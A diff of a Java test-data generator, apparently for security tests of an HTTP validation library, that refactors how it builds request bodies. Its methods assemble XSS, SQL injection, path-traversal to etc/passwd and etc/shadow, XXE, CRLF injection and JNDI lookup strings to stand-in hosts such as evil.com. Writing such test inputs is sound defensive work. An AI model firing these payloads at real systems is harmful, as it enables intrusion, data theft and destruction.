@@ -31,19 +31,21 @@ public class HTTPBodyGenerator implements TypedGenerator<HTTPBody> {
 
     // Core generation parameters
     private final TypedGenerator<Integer> contentTypeGenerator = Generators.integers(0, 3);
-    private final TypedGenerator<String> userNames = Generators.fixedValues("john", "admin", "user", "test");
-    private final TypedGenerator<String> roles = Generators.fixedValues("admin", "user", "guest", "manager");
-    private final TypedGenerator<String> scriptNames = Generators.fixedValues("alert", "confirm", "prompt");
-    private final TypedGenerator<String> xssPayloads = Generators.fixedValues("XSS", "1", "document.cookie");
-    private final TypedGenerator<String> sqlCommands = Generators.fixedValues("DROP TABLE", "DELETE FROM", "INSERT INTO");
-    private final TypedGenerator<String> tableNames = Generators.fixedValues("users", "admin", "accounts", "sessions");
-    private final TypedGenerator<String> systemFiles = Generators.fixedValues("etc/passwd", "windows/win.ini", "boot.ini", "etc/shadow");
-    private final TypedGenerator<String> jndiHosts = Generators.fixedValues("evil.com", "attacker.net", "malicious.org");
-    private final TypedGenerator<String> dataTypes = Generators.fixedValues("user", "product", "order", "session");
+    private final TypedGenerator<String> userNameCategories = Generators.fixedValues("john", "admin", "user", "test");
+    private final TypedGenerator<String> roleCategories = Generators.fixedValues("admin", "user", "guest", "manager");
+    private final TypedGenerator<String> scriptTypes = Generators.fixedValues("alert", "confirm", "prompt");
+    private final TypedGenerator<String> xssCategories = Generators.fixedValues("XSS", "1", "cookie");
+    private final TypedGenerator<String> sqlTypes = Generators.fixedValues("DROP", "DELETE", "INSERT");
+    private final TypedGenerator<String> tableCategories = Generators.fixedValues("users", "admin", "accounts", "sessions");
+    private final TypedGenerator<String> systemPathTypes = Generators.fixedValues("etc", "windows", "boot", "shadow");
+    private final TypedGenerator<String> domainCategories = Generators.fixedValues("evil", "attacker", "malicious");
+    private final TypedGenerator<String> dataCategories = Generators.fixedValues("user", "product", "order", "session");
+    private final TypedGenerator<String> encodingCategories = Generators.fixedValues("gzip", "deflate", "br", "compress");
     private final TypedGenerator<Integer> depthGen = Generators.integers(1, 5);
     private final TypedGenerator<Integer> payloadSize = Generators.integers(100, 500);
-    private final TypedGenerator<String> encodingTypes = Generators.fixedValues("gzip", "deflate", "br", "compress");
     private final TypedGenerator<Boolean> contextSelector = Generators.booleans();
+    private final TypedGenerator<Integer> stringSize = Generators.integers(3, 12);
+    private final TypedGenerator<Integer> numberRange = Generators.integers(100, 999);
 
     @Override
     public HTTPBody next() {
@@ -77,20 +79,20 @@ public class HTTPBodyGenerator implements TypedGenerator<HTTPBody> {
     }
 
     private String generateJsonContent() {
-        String user = userNames.next();
-        String role = roles.next();
+        String user = generateUserName();
+        String role = generateRole();
         return "{\"user\":\"" + user + "\",\"role\":\"" + role + "\"}";
     }
 
     private String generateFormData() {
-        String user = userNames.next();
-        String pass = "secret" + Generators.integers(100, 999).next();
+        String user = generateUserName();
+        String pass = "secret" + numberRange.next();
         return "username=" + user + "&password=" + pass;
     }
 
     private String generateXmlContent() {
-        String user = userNames.next();
-        String role = roles.next();
+        String user = generateUserName();
+        String role = generateRole();
         return "<user><name>" + user + "</name><role>" + role + "</role></user>";
     }
 
@@ -107,19 +109,19 @@ public class HTTPBodyGenerator implements TypedGenerator<HTTPBody> {
     }
 
     private String generateFileContent() {
-        String dataType = dataTypes.next();
+        String dataType = generateDataType();
         int id = Generators.integers(1000, 9999).next();
         return "data: " + id + ", type: " + dataType;
     }
 
     private String generateTokenContent() {
-        String prefix = Generators.fixedValues("token", "id", "key").next();
+        String prefix = generateTokenPrefix();
         String value = Generators.letterStrings(8, 16).next().toLowerCase();
         return prefix + ": " + value;
     }
 
     private String generateStatusContent() {
-        String status = Generators.fixedValues("active", "inactive", "pending", "completed").next();
+        String status = generateStatus();
         String version = Generators.integers(1, 5).next() + "." + Generators.integers(0, 9).next();
         return "status: " + status + ", version: " + version;
     }
@@ -141,14 +143,14 @@ public class HTTPBodyGenerator implements TypedGenerator<HTTPBody> {
     }
 
     private String generateXSSAttack() {
-        String scriptName = scriptNames.next();
-        String payload = xssPayloads.next();
+        String scriptName = generateScriptName();
+        String payload = generateXSSPayload();
         return "<script>" + scriptName + "('" + payload + "')</script>";
     }
 
     private String generateSQLInjection() {
-        String command = sqlCommands.next();
-        String table = tableNames.next();
+        String command = generateSQLCommand();
+        String table = generateTableName();
         return "'; " + command + " " + table + "; --";
     }
 
@@ -158,13 +160,13 @@ public class HTTPBodyGenerator implements TypedGenerator<HTTPBody> {
         for (int i = 0; i < depth; i++) {
             path.append("../");
         }
-        path.append(systemFiles.next());
+        path.append(generateSystemFile());
         return path.toString();
     }
 
     private String generateJNDIAttack() {
-        String host = jndiHosts.next();
-        String exploit = Generators.fixedValues("exploit", "payload", "attack").next();
+        String host = generateMaliciousDomain();
+        String exploit = generateExploitTerm();
         return "${jndi:ldap://" + host + "/" + exploit + "}";
     }
 
@@ -179,18 +181,18 @@ public class HTTPBodyGenerator implements TypedGenerator<HTTPBody> {
     }
 
     private String generateResponseSplitting() {
-        String status = Generators.fixedValues("200 OK", "404 Not Found", "500 Error").next();
+        String status = generateHTTPStatus();
         return "%0d%0a%0d%0aHTTP/1.1 " + status + "%0d%0a";
     }
 
     private String generateXXEAttack() {
-        String systemFile = systemFiles.next();
-        String entityName = Generators.fixedValues("xxe", "exploit", "file").next();
+        String systemFile = generateSystemFile();
+        String entityName = generateEntityName();
         return "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY " + entityName + " SYSTEM \"file:///" + systemFile + "\">]><foo>&" + entityName + ";</foo>";
     }
 
     private String generateUnicodeAttack() {
-        String scriptName = scriptNames.next();
+        String scriptName = generateScriptName();
         return "\\u202e\\u202d" + scriptName + ":alert(1)";
     }
 
@@ -225,13 +227,13 @@ public class HTTPBodyGenerator implements TypedGenerator<HTTPBody> {
     }
 
     private String generateMalformedJson() {
-        String key = dataTypes.next();
-        String value = Generators.fixedValues("json", "data", "value").next();
+        String key = generateDataType();
+        String value = generateJSONValue();
         return "{\"" + key + "\": " + value + ",}"; // Extra comma
     }
 
     private String generateMalformedXml() {
-        String tagName = dataTypes.next();
+        String tagName = generateDataType();
         return "<" + tagName + "><tag>"; // Unclosed tags
     }
 
@@ -246,7 +248,7 @@ public class HTTPBodyGenerator implements TypedGenerator<HTTPBody> {
     }
 
     private String generateHeaderInjection() {
-        String header = Generators.fixedValues("Content-Type", "X-Forwarded-For", "User-Agent").next();
+        String header = generateHeaderName();
         return header + ": text/html\\r\\n\\r\\n<html>";
     }
 
@@ -283,7 +285,7 @@ public class HTTPBodyGenerator implements TypedGenerator<HTTPBody> {
     }
 
     private String generateAttackContentType() {
-        String attack = Generators.fixedValues("script", "header", "passwd").next();
+        String attack = generateAttackTerm();
         return "text/html; charset=<" + attack + ">alert(1)</" + attack + ">";
     }
 
@@ -311,16 +313,16 @@ public class HTTPBodyGenerator implements TypedGenerator<HTTPBody> {
     }
 
     private String generateStandardEncoding() {
-        String encoding = encodingTypes.next();
+        String encoding = generateEncodingType();
         if (contextSelector.next()) {
-            String second = encodingTypes.next();
+            String second = generateEncodingType();
             return encoding + ", " + second;
         }
         return encoding;
     }
 
     private String generateAttackEncoding() {
-        String attack = Generators.fixedValues("script", "header", "passwd").next();
+        String attack = generateAttackTerm();
         return "gzip\\r\\nX-Injected: " + attack;
     }
 
@@ -332,6 +334,145 @@ public class HTTPBodyGenerator implements TypedGenerator<HTTPBody> {
             case 2 -> "gzip\\u0000deflate";
             case 3 -> Generators.letterStrings(50, 200).next();
             default -> "   ";
+        };
+    }
+
+    private String generateUserName() {
+        int userType = Generators.integers(0, 3).next();
+        return switch (userType) {
+            case 0 -> userNameCategories.next();
+            case 1 -> "user" + Generators.integers(1, 999).next();
+            case 2 -> Generators.letterStrings(4, 8).next().toLowerCase();
+            case 3 -> Generators.fixedValues("john", "admin", "guest", "demo").next();
+            default -> userNameCategories.next();
+        };
+    }
+
+    private String generateRole() {
+        int roleType = Generators.integers(0, 2).next();
+        return switch (roleType) {
+            case 0 -> roleCategories.next();
+            case 1 -> "role_" + Generators.letterStrings(3, 6).next().toLowerCase();
+            case 2 -> Generators.fixedValues("super", "basic", "read", "write").next();
+            default -> roleCategories.next();
+        };
+    }
+
+    private String generateDataType() {
+        int dataType = Generators.integers(0, 2).next();
+        return switch (dataType) {
+            case 0 -> dataCategories.next();
+            case 1 -> "type_" + Generators.letterStrings(3, 7).next().toLowerCase();
+            case 2 -> Generators.fixedValues("item", "record", "entity", "model").next();
+            default -> dataCategories.next();
+        };
+    }
+
+    private String generateTokenPrefix() {
+        String[] prefixes = {"token", "id", "key", "auth", "bearer", "access"};
+        return prefixes[Generators.integers(0, prefixes.length - 1).next()];
+    }
+
+    private String generateStatus() {
+        String[] statuses = {"active", "inactive", "pending", "completed", "running", "failed"};
+        return statuses[Generators.integers(0, statuses.length - 1).next()];
+    }
+
+    private String generateScriptName() {
+        int scriptType = Generators.integers(0, 2).next();
+        return switch (scriptType) {
+            case 0 -> scriptTypes.next();
+            case 1 -> Generators.fixedValues("eval", "setTimeout", "setInterval").next();
+            case 2 -> "func" + Generators.integers(1, 99).next();
+            default -> scriptTypes.next();
+        };
+    }
+
+    private String generateXSSPayload() {
+        int xssType = Generators.integers(0, 3).next();
+        return switch (xssType) {
+            case 0 -> xssCategories.next();
+            case 1 -> "document." + Generators.fixedValues("cookie", "domain", "location").next();
+            case 2 -> String.valueOf(Generators.integers(1, 9999).next());
+            case 3 -> "'" + Generators.letterStrings(3, 8).next() + "'";
+            default -> xssCategories.next();
+        };
+    }
+
+    private String generateSQLCommand() {
+        String type = sqlTypes.next();
+        return switch (type) {
+            case "DROP" -> "DROP TABLE";
+            case "DELETE" -> "DELETE FROM";
+            case "INSERT" -> "INSERT INTO";
+            default -> type + " " + Generators.fixedValues("FROM", "INTO", "TABLE").next();
+        };
+    }
+
+    private String generateTableName() {
+        int tableType = Generators.integers(0, 2).next();
+        return switch (tableType) {
+            case 0 -> tableCategories.next();
+            case 1 -> "tbl_" + Generators.letterStrings(4, 8).next().toLowerCase();
+            case 2 -> Generators.fixedValues("data", "config", "logs", "temp").next();
+            default -> tableCategories.next();
+        };
+    }
+
+    private String generateSystemFile() {
+        String pathType = systemPathTypes.next();
+        return switch (pathType) {
+            case "etc" -> "etc/" + Generators.fixedValues("passwd", "shadow", "hosts", "config").next();
+            case "windows" -> "windows/" + Generators.fixedValues("win.ini", "system.ini", "boot.ini").next();
+            case "boot" -> "boot.ini";
+            case "shadow" -> "etc/shadow";
+            default -> pathType + "/" + Generators.letterStrings(3, 8).next();
+        };
+    }
+
+    private String generateMaliciousDomain() {
+        String category = domainCategories.next();
+        String tld = Generators.fixedValues("com", "net", "org", "xyz").next();
+        return category + "." + tld;
+    }
+
+    private String generateExploitTerm() {
+        String[] terms = {"exploit", "payload", "attack", "shell", "cmd", "exec"};
+        return terms[Generators.integers(0, terms.length - 1).next()];
+    }
+
+    private String generateHTTPStatus() {
+        String[] statuses = {"200 OK", "404 Not Found", "500 Error", "403 Forbidden", "401 Unauthorized"};
+        return statuses[Generators.integers(0, statuses.length - 1).next()];
+    }
+
+    private String generateEntityName() {
+        String[] entities = {"xxe", "exploit", "file", "entity", "dtd", "external"};
+        return entities[Generators.integers(0, entities.length - 1).next()];
+    }
+
+    private String generateJSONValue() {
+        String[] values = {"json", "data", "value", "content", "payload", "info"};
+        return values[Generators.integers(0, values.length - 1).next()];
+    }
+
+    private String generateHeaderName() {
+        String[] headers = {"Content-Type", "X-Forwarded-For", "User-Agent", "Authorization", "X-Custom", "Accept"};
+        return headers[Generators.integers(0, headers.length - 1).next()];
+    }
+
+    private String generateAttackTerm() {
+        String[] terms = {"script", "header", "passwd", "admin", "root", "cmd"};
+        return terms[Generators.integers(0, terms.length - 1).next()];
+    }
+
+    private String generateEncodingType() {
+        int encodingType = Generators.integers(0, 2).next();
+        return switch (encodingType) {
+            case 0 -> encodingCategories.next();
+            case 1 -> Generators.fixedValues("identity", "chunked", "x-gzip").next();
+            case 2 -> "custom-" + Generators.letterStrings(2, 5).next();
+            default -> encodingCategories.next();
         };
     }
 
